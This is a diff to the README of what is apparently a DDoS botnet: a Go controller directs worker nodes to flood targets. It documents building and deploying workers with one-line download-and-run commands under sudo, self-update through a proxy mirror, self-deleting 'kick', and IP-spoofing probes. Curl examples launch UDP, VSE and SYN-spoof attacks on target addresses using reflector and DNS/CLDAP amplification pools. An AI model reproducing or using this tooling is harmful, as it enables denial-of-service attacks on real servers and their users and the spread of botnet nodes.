@@ -27,17 +27,26 @@ flowchart LR
 ### 1. Build
 
 ```bash
-# Linux (primary target)
-GOOS=linux GOARCH=amd64 CGO_ENABLED=0 go build -ldflags="-s -w" -o dist/controller-linux-amd64 ./cmd/controller/
-GOOS=linux GOARCH=amd64 CGO_ENABLED=0 go build -ldflags="-s -w" -o dist/worker-linux-amd64    ./cmd/worker/
+# Linux (primary target) — controller version tag + repo are injected for cloud updates
+GOOS=linux GOARCH=amd64 CGO_ENABLED=0 go build \
+  -ldflags="-s -w -X main.buildVersion=v1.1.2 -X main.gitRepo=2476818641/newtool" \
+  -o dist/controller-linux-amd64 ./cmd/controller/
+GOOS=linux GOARCH=amd64 CGO_ENABLED=0 go build -ldflags="-s -w" \
+  -o dist/worker-linux-amd64 ./cmd/worker/
 
 # Windows (limited: no IP spoofing)
-GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o dist/controller-windows-amd64.exe ./cmd/controller/
-GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o dist/worker-windows-amd64.exe    ./cmd/worker/
+GOOS=windows GOARCH=amd64 go build \
+  -ldflags="-s -w -X main.buildVersion=v1.1.2 -X main.gitRepo=2476818641/newtool" \
+  -o dist/controller-windows-amd64.exe ./cmd/controller/
+GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" \
+  -o dist/worker-windows-amd64.exe ./cmd/worker/
 ```
 
 `-ldflags="-s -w"` strips debug symbols to reduce size (controller ~17MB, worker ~12MB).
-Pre-built binaries for all four platforms are included in the `dist/` directory.
+`-X main.buildVersion` marks the controller's own version (used as the default cloud-update
+target so workers stay in sync); `-X main.gitRepo` enables the default GitHub release
+download URL. Pre-built binaries are also published as **GitHub Releases** (compressed with
+UPX via GitHub Actions, tag `vX.Y.Z`).
 
 ### 2. Start Controller
 
@@ -90,6 +99,7 @@ sudo ./worker -c <controller-ip>:9090 -token <worker-token> -install
 - `-proxy` — Fetch L7 proxies from controller (optional)
 - `-install` — Install as systemd/Windows service (optional)
 - `-daemon` — Run in background without nohup (optional, for non-root users; log `data/worker.log`, pid `data/worker.pid`)
+- `-http-port` — Controller HTTP port (default 8080; required when the controller listens on a non-default HTTP port)
 
 **Default behavior:**
 - Bandwidth: unlimited, auto-throttled when controller disconnects
@@ -229,7 +239,9 @@ socks5://user:pass@socks.example.com:1080
 Click **Save** to persist. Workers with `--proxy controller` auto-fetch.
 
 ### Worker Command
-Dashboard shows ready-to-copy worker command string.
+Dashboard shows a ready-to-copy worker command string. Use **curl** or **wget** for the
+download step and click **Copy** for one-click copy. The command stays on a single line
+with horizontal scroll.
 
 ### Quick Deploy (快速上线)
 Set a **cloud storage URL** (direct link to the worker binary), pick optional flags
@@ -237,6 +249,41 @@ Set a **cloud storage URL** (direct link to the worker binary), pick optional fl
 and the dashboard concatenates the controller address + worker token into a one-line
 download-and-run command. `-install` and `-daemon` are mutually exclusive.
 Config persists in `data/deploy_storage_url.txt`.
+
+The command is fully automatic: controller public IP is probed and cached (1h), the gRPC/HTTP
+ports are derived from the controller's listen addresses, and the worker token is read from
+`data/auth/worker.token`. `-install` commands are wrapped in `sudo bash -c` and start the
+service immediately after install.
+
+### Check Updates (检查更新)
+Dashboard panel that queries GitHub for new releases. **Nothing updates automatically** —
+you review the version diff, release notes and link, then choose:
+- **Upgrade All (整体升级)** — sets workers' cloud-update target, then upgrades the
+  controller itself (download → verify → replace → restart)
+- **Update Controller** — upgrade only the controller
+- **Update Workers** — set all workers to auto-update within ~60s
+- Version dropdown lists all releases (with dates) so you can also roll back to an older tag.
+
+Optional **GitHub Token** raises the API rate limit from 60/h to 5000/h and enables the
+version list. Persisted in `data/github_token.txt`.
+
+### Cloud Update (云更新 Worker)
+Workers poll `/api/deploy/version` every 60s. When the configured target differs from their
+current version, they download the new binary (via the ghproxy prefix if configured),
+verify it (ELF/PE magic + size), atomically replace with `.bak` rollback, and restart
+(Linux keeps the PID via `syscall.Exec`). The default download URL is the GitHub release of
+the controller's build tag per platform (worker-linux-amd64 / worker-windows-amd64.exe),
+prefixed with `https://cf.liuass.eu.org/ghproxy/` for restricted networks.
+
+### Node Management (节点管理)
+- **Kick (踢出)** — remove a node: it stops attacks, writes `data/kicked`, disables the
+  systemd service / scheduled task, deletes its own binary and exits. Re-registration from
+  a kicked ID is rejected by the controller; delete `data/kicked` to re-enable.
+- **Spoof flag** — each node shows its IP-spoofing capability (YES / NO / detecting).
+  Results are cached per IP in `data/spoof_cache.json`: a worker re-joining from the same
+  IP skips the probe and reuses the stored result.
+- **Target Nodes** — task form lets you pick which nodes participate (default: all).
+  Opens a searchable modal (search by ID/IP/location); empty selection = all nodes.
 
 ### Reflector Pool Manager (`/pool`)
 Separate page for managing game-specific reflector pools. Each game tab (ARK / CS2 / Rust / Other) contains:
@@ -266,6 +313,35 @@ curl -X POST http://localhost:8080/api/tasks \
   -H "Authorization: Bearer <admin-token>" \
   -H "Content-Type: application/json" \
   -d '{"target":"1.2.3.4:27015","method":"vse","duration":60,"threads":20}'
+
+# Attack with selected workers only (empty = all online nodes)
+curl -X POST http://localhost:8080/api/tasks \
+  -H "Authorization: Bearer <admin-token>" \
+  -H "Content-Type: application/json" \
+  -d '{"target":"1.2.3.4:27015","method":"udp_stdhex","duration":60,"threads":20,
+       "workers":["1-2-3-4-node1","5-6-7-8-node1"]}'
+
+# Kick a node (stops attacks, self-deletes, prevents auto-restart)
+curl -X POST http://localhost:8080/api/nodes/1-2-3-4-node1/kick \
+  -H "Authorization: Bearer <admin-token>"
+
+# Undo a kick (before the worker exits)
+curl -X DELETE http://localhost:8080/api/nodes/1-2-3-4-node1/kick \
+  -H "Authorization: Bearer <admin-token>"
+
+# Check for updates (version diff + release notes + links)
+curl http://localhost:8080/api/update/check \
+  -H "Authorization: Bearer <admin-token>"
+
+# Set GitHub token (5000 req/h + version list)
+curl -X PUT http://localhost:8080/api/update/token \
+  -H "Authorization: Bearer <admin-token>" \
+  -H "Content-Type: application/json" \
+  -d '{"token":"ghp_..."}'
+
+# Upgrade everything (workers first, then controller) to a specific version
+curl -X POST "http://localhost:8080/api/update/all?version=v1.1.2" \
+  -H "Authorization: Bearer <admin-token>"
 
 # Create TCP SYN spoof attack (Linux only)
 curl -X POST http://localhost:8080/api/tasks \
@@ -329,15 +405,21 @@ ds/
 │   │   └── ratelimiter_test.go # Rate limiter unit tests
 │   ├── controller/
 │   │   ├── controller.go     # gRPC + REST + WebSocket server
+│   │   ├── self_update.go    # Update check + controller self-update + GitHub token
+│   │   ├── self_update_unix.go # syscall.Exec restart (Linux)
+│   │   ├── self_update_windows.go # spawn restart (Windows)
 │   │   ├── shodan.go         # Shodan API DNS discovery integration
-│   │   ├── spoof_probe.go    # UDP spoof probe listener
-│   │   └── tls.go            # Optional TLS certificate loading
+│   │   ├── spoof_probe.go    # UDP spoof probe listener + per-IP spoof cache
+│   │   └── tls.go            # Optional TLS certificate loading + protocol sniffing
 │   ├── worker/
-│   │   ├── worker.go         # gRPC client + task runner + auto-start
+│   │   ├── worker.go         # gRPC client + task runner + auto-start + kick
+│   │   ├── update.go         # Cloud self-update (download/verify/replace/restart)
+│   │   ├── update_unix.go    # syscall.Exec restart (Linux)
+│   │   ├── update_windows.go # spawn restart (Windows)
 │   │   ├── bandwidth.go      # Linux NIC bandwidth auto-detection
 │   │   ├── local_pool.go     # Worker-local SQLite reflector cache
 │   │   ├── location.go       # Geolocation via api.ip.cc
-│   │   ├── spoof_probe.go    # Worker-side spoofing capability probe
+│   │   ├── spoof_probe.go    # Worker-side spoofing capability probe + cache query
 │   │   ├── sysinfo_linux.go  # Linux CPU/Memory usage collection
 │   │   └── sysinfo_windows.go# Windows CPU/Memory usage collection
 │   ├── reflector/
@@ -351,6 +433,7 @@ ds/
 │   └── static/
 │       ├── index.html        # Alpine.js dashboard SPA (EN/ZH i18n)
 │       └── pool.html         # Reflector pool manager (EN/ZH i18n)
+├── .github/workflows/release.yml # Tag-triggered build + UPX + GitHub Release
 ├── data/                     # Runtime files (auto-created)
 │   ├── auth/
 │   │   ├── admin.token
@@ -358,6 +441,10 @@ ds/
 │   ├── steam_api.key         # Steam Web API key (optional)
 │   ├── shodan_config.json    # Shodan API config
 │   ├── reflectors.db         # SQLite reflector pools
+│   ├── deploy_update.json    # Cloud-update target {version,url}
+│   ├── deploy_storage_url.txt # Quick-deploy storage URL
+│   ├── github_token.txt      # GitHub token (optional, 5000 req/h)
+│   ├── spoof_cache.json      # Per-IP spoof capability cache
 │   ├── dns_amp_domain.txt    # Custom DNS amplification domain
 │   ├── dns_amp_domains.txt   # DNS amplification domain list
 │   └── proxies.txt           # Global proxy list
@@ -400,12 +487,14 @@ ds/
 | Endpoint | Method | Auth | Description |
 |----------|--------|------|-------------|
 | `/api/auth` | POST | No | Login with token, returns role |
-| `/api/nodes` | GET | Bearer | List connected worker nodes (with CPU/Memory) |
+| `/api/nodes` | GET | Bearer | List connected worker nodes (with CPU/Memory/spoof flag) |
+| `/api/nodes/:id/kick` | POST | Bearer | Kick a node (self-exit + delete binary, blocks re-register) |
+| `/api/nodes/:id/kick` | DELETE | Bearer | Undo a kick before the worker exits |
 | `/api/tasks` | GET | Bearer | List all tasks |
-| `/api/tasks` | POST | Bearer | Create attack task (supports `sub_attacks` for combo) |
+| `/api/tasks` | POST | Bearer | Create attack task (supports `sub_attacks` combo, `workers` selective nodes) |
 | `/api/tasks/:id/stop` | POST | Bearer | Stop running task |
 | `/api/stats` | GET | Bearer | Aggregated live stats (PPS, BPS, packets) |
-| `/api/scan` | POST | Bearer | VSE/DNS server scan (single IP or range) |
+| `/api/scan` | POST | Bearer | VSE/DNS/CLDAP server scan (single IP or range) |
 | `/api/proxy` | GET | Bearer | Get global proxy file contents |
 | `/api/proxy` | PUT | Bearer | Update global proxy file |
 | `/api/pools` | GET | Bearer | List game pools with counts |
@@ -417,7 +506,18 @@ ds/
 | `/api/reflectors/version` | GET | Bearer | Pool version hash + count (for worker cache) |
 | `/api/templates` | GET/POST/DELETE | Bearer | Attack template CRUD |
 | `/api/deploy/config` | GET/PUT | Bearer | Quick-deploy cloud storage URL |
-| `/api/deploy/command` | GET | Bearer | Assemble deploy command (`addr`, `proxy=1`, `install=1`, `daemon=1`) |
+| `/api/deploy/command` | GET | Bearer | Assemble deploy command (`tool=curl\|wget`, `proxy=1`, `install=1`, `daemon=1`) |
+| `/api/deploy/update` | PUT/GET | Admin | Set worker cloud-update target `{version,url}` (`clear:true` to clear) |
+| `/api/deploy/version` | GET | Bearer | Worker-polled update target (per-platform GitHub URL when unset) |
+| `/api/update/check` | GET | Bearer | Check GitHub for new releases (diff + notes + links + version list) |
+| `/api/update/token` | GET/PUT | Admin | Manage GitHub token (5000 req/h, enables version list) |
+| `/api/update/controller` | POST | Admin | Update controller itself (`?version=` to pick a tag) |
+| `/api/update/workers` | POST | Admin | Set workers to auto-update (`?version=` to pick a tag) |
+| `/api/update/all` | POST | Admin | Upgrade all: workers first, then controller |
+| `/api/worker/spoof-probe` | POST | Bearer | Spoof probe registration (worker) |
+| `/api/worker/spoof-probe/result` | GET | Bearer | Spoof probe result polling (worker) |
+| `/api/worker/spoof-status` | POST | Bearer | Worker reports spoof result (cached per IP) |
+| `/api/worker/spoof-cache` | GET | Bearer | Query per-IP spoof cache (skip probe on rejoin) |
 | `/api/logs` | GET | Bearer | Attack log history |
 | `/api/logs/export` | GET | Bearer | CSV export |
 | `/ws` | WS | query | Real-time dashboard push stream |
